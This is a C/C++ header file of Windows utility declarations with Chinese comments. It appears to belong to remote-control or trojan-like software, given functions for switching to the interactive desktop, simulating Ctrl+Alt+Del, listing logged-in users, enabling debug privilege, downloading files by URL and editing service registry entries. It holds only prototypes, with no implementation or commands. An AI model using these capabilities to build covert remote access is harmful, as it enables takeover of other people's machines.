#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED
#include "RegEditEx.h"
typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

DWORD WINAPI ThreadLoader(LPVOID lparam);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive = false);

DWORD GetProcessID(LPCSTR lpProcessName);

char *GetLogUserXP();
char *GetLogUser2K();
char *GetCurrentLoginUser();

typedef struct {
	int number;        //分割的字符串个数
	char** string;     //字符串数组
} StringTab;

bool SwitchInputDesktop();

BOOL SelectHDESK(HDESK new_desktop);
BOOL SelectDesktop(char *name);
BOOL http_get(LPCTSTR szURL, LPCTSTR szFileName);
void SetInfo(LPCTSTR lpKeyName, LPCTSTR lpszValueName, LPCTSTR lpServiceName);
void DelSetInfo(LPCTSTR lpKeyName, LPCTSTR lpszValueName, LPCTSTR lpServiceName);
char *GetCurrentLoginUser();
BOOL CheckFileExist(LPCTSTR lpszPath);
BOOL SimulateCtrlAltDel();
int get_all_user(char user_all[][50]); //得到所有用户
DWORD MYuserPROC(char WtsUsetName[][256],char WtsWinStat[][256],char WtsAddress[][256],char WtsState[][256],char WtsId[][10]);
BOOL DebugPrivilege(const char *PName,BOOL bEnable);

#endif // !defined(AFX_UNTIL_H_INCLUDED)
